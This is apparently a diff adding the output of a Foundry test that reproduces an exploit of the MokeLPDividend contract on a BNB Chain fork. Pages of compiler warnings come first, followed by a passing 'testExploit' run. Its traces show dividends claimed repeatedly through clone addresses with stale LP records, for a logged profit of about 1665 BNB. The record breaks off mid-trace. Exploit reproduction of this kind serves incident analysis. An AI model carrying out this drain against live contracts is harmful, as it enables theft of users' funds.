@@ -1,0 +1,1733 @@
+Warning: Found unknown `eth_rpc_retries` config for profile `default` defined in foundry.toml.
+Compiling 23 files with Solc 0.8.35
+Solc 0.8.35 finished in 518.74ms
+Compiler run successful with warnings:
+Warning (8429): Virtual modifiers are deprecated and scheduled for removal.
+  --> basetest.sol:87:5:
+   |
+87 |     modifier balanceLog() virtual {
+   |     ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (8429): Virtual modifiers are deprecated and scheduled for removal.
+   --> basetest.sol:103:5:
+    |
+103 |     modifier balanceLog2(address target) virtual {
+    |     ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1241:9:
+     |
+1241 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1255:9:
+     |
+1255 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1263:79:
+     |
+1263 |     function assertApproxEqAbs(uint256 left, uint256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                               ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1270:77:
+     |
+1270 |     function assertApproxEqAbs(int256 left, int256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1287:9:
+     |
+1287 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1305:9:
+     |
+1305 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1315:86:
+     |
+1315 |     function assertApproxEqRel(uint256 left, uint256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1326:84:
+     |
+1326 |     function assertApproxEqRel(int256 left, int256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1335:77:
+     |
+1335 |     function assertEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1342:75:
+     |
+1342 |     function assertEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1348:46:
+     |
+1348 |     function assertEq(bool left, bool right, string calldata error) external pure;
+     |                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1354:68:
+     |
+1354 |     function assertEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1360:66:
+     |
+1360 |     function assertEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1366:68:
+     |
+1366 |     function assertEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1372:74:
+     |
+1372 |     function assertEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1378:72:
+     |
+1378 |     function assertEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1387:74:
+     |
+1387 |     function assertEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1393:74:
+     |
+1393 |     function assertEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1399:72:
+     |
+1399 |     function assertEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1405:70:
+     |
+1405 |     function assertEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1408:52:
+     |
+1408 |     function assertEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1414:50:
+     |
+1414 |     function assertEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1420:52:
+     |
+1420 |     function assertEq(address left, address right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1426:52:
+     |
+1426 |     function assertEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1432:42:
+     |
+1432 |     function assertFalse(bool condition, string calldata error) external pure;
+     |                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1440:77:
+     |
+1440 |     function assertGeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1448:75:
+     |
+1448 |     function assertGeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1455:52:
+     |
+1455 |     function assertGe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1462:50:
+     |
+1462 |     function assertGe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1470:77:
+     |
+1470 |     function assertGtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1478:75:
+     |
+1478 |     function assertGtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1485:52:
+     |
+1485 |     function assertGt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1492:50:
+     |
+1492 |     function assertGt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1500:77:
+     |
+1500 |     function assertLeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1508:75:
+     |
+1508 |     function assertLeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1515:52:
+     |
+1515 |     function assertLe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1522:50:
+     |
+1522 |     function assertLe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1530:77:
+     |
+1530 |     function assertLtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1538:75:
+     |
+1538 |     function assertLtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1545:52:
+     |
+1545 |     function assertLt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1552:50:
+     |
+1552 |     function assertLt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1559:80:
+     |
+1559 |     function assertNotEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                                ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1566:78:
+     |
+1566 |     function assertNotEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1572:49:
+     |
+1572 |     function assertNotEq(bool left, bool right, string calldata error) external pure;
+     |                                                 ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1578:71:
+     |
+1578 |     function assertNotEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1584:69:
+     |
+1584 |     function assertNotEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1590:71:
+     |
+1590 |     function assertNotEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1596:77:
+     |
+1596 |     function assertNotEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1602:75:
+     |
+1602 |     function assertNotEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1611:77:
+     |
+1611 |     function assertNotEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1617:77:
+     |
+1617 |     function assertNotEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1623:75:
+     |
+1623 |     function assertNotEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1629:73:
+     |
+1629 |     function assertNotEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1632:55:
+     |
+1632 |     function assertNotEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1638:53:
+     |
+1638 |     function assertNotEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1644:55:
+     |
+1644 |     function assertNotEq(address left, address right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1650:55:
+     |
+1650 |     function assertNotEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1656:41:
+     |
+1656 |     function assertTrue(bool condition, string calldata error) external pure;
+     |                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+   --> interface.sol:300:19:
+    |
+300 |     event Failure(uint256 error, uint256 info, uint256 detail);
+    |                   ^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> interface.sol:1302:19:
+     |
+1302 |     event Failure(uint256 error, uint256 info, uint256 detail);
+     |                   ^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> interface.sol:1450:19:
+     |
+1450 |     event Failure(uint256 error, uint256 info, uint256 detail);
+     |                   ^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> interface.sol:3545:19:
+     |
+3545 |     event Failure(uint256 error, uint256 info, uint256 detail);
+     |                   ^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> interface.sol:3842:19:
+     |
+3842 |     event Failure(uint256 error, uint256 info, uint256 detail);
+     |                   ^^^^^^^^^^^^^
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:1084:5:
+     |
+1084 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:1896:5:
+     |
+1896 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:2198:5:
+     |
+2198 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:2967:5:
+     |
+2967 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:4462:5:
+     |
+4462 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (4591): There are more than 256 warnings. Ignoring the rest.
+
+Ran 1 test for test/MOKE_exp.sol:ContractTest
+[PASS] testExploit() (gas: 3518225)
+Logs:
+  Attacker Before exploit BNB Balance: 0.000000000000000000
+  Claimed via clones (BNB): 1639.294828337604995436
+  Attacker profit (BNB): 1665.616470889346105615
+  Dividend contract leftover: 0.000000000000049339
+  Attacker After exploit BNB Balance: 1665.616470889346105615
+
+Traces:
+  [1515956] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("<rpc url>", 113652608 [1.136e8])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(Attacker EOA: [0xE454a9BAC1a44868e4A9Cbe1a4B5ac231D0DCF8a], "Attacker EOA")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(MokeLPDividend: [0x5ae569d8a0539a6A603E96A26ac8CaEA7CEba377], "MokeLPDividend")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(MOKE: [0x1A35C16cE21903Bc17Fd020c4ED73fEdC70c1b2A], "MOKE")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(MOKE/WBNB LP: [0xBA6a49A97Cc725B3C39d6C5ea6dEfFddb64fe6b8], "MOKE/WBNB LP")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], "WBNB")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], "PancakeRouter")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Venus vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36], "Venus vBNB")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [4403047] ContractTest::testExploit()
+    ├─ [0] VM::deal(Attacker EOA: [0xE454a9BAC1a44868e4A9Cbe1a4B5ac231D0DCF8a], 0)
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "Attacker Before exploit BNB Balance", val: 0, decimals: 18)
+    ├─ [2537] MOKE/WBNB LP::balanceOf(Attacker EOA: [0xE454a9BAC1a44868e4A9Cbe1a4B5ac231D0DCF8a]) [staticcall]
+    │   └─ ← [Return] 1334183807563777105758 [1.334e21]
+    ├─ [0] VM::assertGt(1334183807563777105758 [1.334e21], 0, "attacker should still hold the real LP") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2587] MokeLPDividend::userLPRecord(0xd4a88C7A85e8136AcB4E7E1e6222a567C663A398) [staticcall]
+    │   └─ ← [Return] 1334183807563777105758 [1.334e21]
+    ├─ [0] VM::assertEq(1334183807563777105758 [1.334e21], 1334183807563777105758 [1.334e21], "stale record on clone #0") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2610] MokeLPDividend::userDividendDebt(0xd4a88C7A85e8136AcB4E7E1e6222a567C663A398) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "debt must be 0 (synced when totalPerLP=0)") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2537] MOKE/WBNB LP::balanceOf(0xd4a88C7A85e8136AcB4E7E1e6222a567C663A398) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "clone holds no LP") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2351] MokeLPDividend::totalDividendPerLP() [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "no distribution yet") [staticcall]
+    │   └─ ← [Return]
+    ├─ [255306] → new MokeLPDividendExploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 1273 bytes of code
+    ├─ [0] VM::deal(MokeLPDividendExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1665616180024096154954 [1.665e21])
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(Attacker EOA: [0xE454a9BAC1a44868e4A9Cbe1a4B5ac231D0DCF8a])
+    │   └─ ← [Return]
+    ├─ [86127] MokeLPDividendExploit::seedAndDistribute(1664616180024096154954 [1.664e21])
+    │   ├─ [24376] MokeLPDividend::fallback{value: 1664616180024096154954}()
+    │   │   ├─  storage changes:
+    │   │   │   @ 11: 0 → 0x00000000000000000000000000000000000000000000005a3d30ac37a7f1654a
+    │   │   └─ ← [Stop]
+    │   ├─ [46744] MokeLPDividend::distributeDividend()
+    │   │   ├─ [2621] MOKE::balanceOf(MokeLPDividend: [0x5ae569d8a0539a6A603E96A26ac8CaEA7CEba377]) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [2439] MOKE/WBNB LP::totalSupply() [staticcall]
+    │   │   │   └─ ← [Return] 87707736520595878692798 [8.77e22]
+    │   │   ├─ emit DividendDistributed(: 1664616180024096154954 [1.664e21], : 87707736520595878692798 [8.77e22], : 18979125970640051 [1.897e16])
+    │   │   ├─  storage changes:
+    │   │   │   @ 4: 0 → 0x00000000000000000000000000000000000000000000000000436d6a1da09cb3
+    │   │   │   @ 11: 0x00000000000000000000000000000000000000000000005a3d30ac37a7f1654a → 0
+    │   │   └─ ← [Stop]
+    │   ├─ [0] Attacker EOA::fallback{value: 1000000000000000000}()
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [351] MokeLPDividend::totalDividendPerLP() [staticcall]
+    │   └─ ← [Return] 18979125970640051 [1.897e16]
+    ├─ [0] VM::assertGt(18979125970640051 [1.897e16], 0, "distribution should accrue") [staticcall]
+    │   └─ ← [Return]
+    ├─ [372] MokeLPDividend::unprocessedBNB() [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "pot should be fully marked distributed") [staticcall]
+    │   └─ ← [Return]
+    ├─ [43071] ContractTest::claimAs(0xd4a88C7A85e8136AcB4E7E1e6222a567C663A398)
+    │   ├─ [0] VM::prank(0xd4a88C7A85e8136AcB4E7E1e6222a567C663A398)
+    │   │   └─ ← [Return]
+    │   ├─ [41709] MokeLPDividend::claimDividend()
+    │   │   ├─ [537] MOKE/WBNB LP::balanceOf(0xd4a88C7A85e8136AcB4E7E1e6222a567C663A398) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xd4a88C7A85e8136AcB4E7E1e6222a567C663A398, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xd4a88C7A85e8136AcB4E7E1e6222a567C663A398::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xd4a88C7A85e8136AcB4E7E1e6222a567C663A398, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x8aca5bd5a3537f1fbc809e795a81b147450e3d63e471b7d5f1c22f8e6f27088e: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xd4a88C7A85e8136AcB4E7E1e6222a567C663A398)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xA7E20d4f581C2A963D92F2DcC4756178bf73A951)
+    │   ├─ [0] VM::prank(0xA7E20d4f581C2A963D92F2DcC4756178bf73A951)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xA7E20d4f581C2A963D92F2DcC4756178bf73A951) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xA7E20d4f581C2A963D92F2DcC4756178bf73A951, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xA7E20d4f581C2A963D92F2DcC4756178bf73A951::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xA7E20d4f581C2A963D92F2DcC4756178bf73A951, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x540eb56aae27df9551376ba14f29ab6235c03bf3dfa0593c1950f9f1dc158ca4: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xA7E20d4f581C2A963D92F2DcC4756178bf73A951)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xf1ba8Dacd6dE56d1305F476fc970Da2BD2Cbe9B8)
+    │   ├─ [0] VM::prank(0xf1ba8Dacd6dE56d1305F476fc970Da2BD2Cbe9B8)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xf1ba8Dacd6dE56d1305F476fc970Da2BD2Cbe9B8) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xf1ba8Dacd6dE56d1305F476fc970Da2BD2Cbe9B8, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xf1ba8Dacd6dE56d1305F476fc970Da2BD2Cbe9B8::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xf1ba8Dacd6dE56d1305F476fc970Da2BD2Cbe9B8, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xdb0793a1a33a3bc862e4c17fead27cb3cd6791dcd6151668d12412a14b72f07d: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
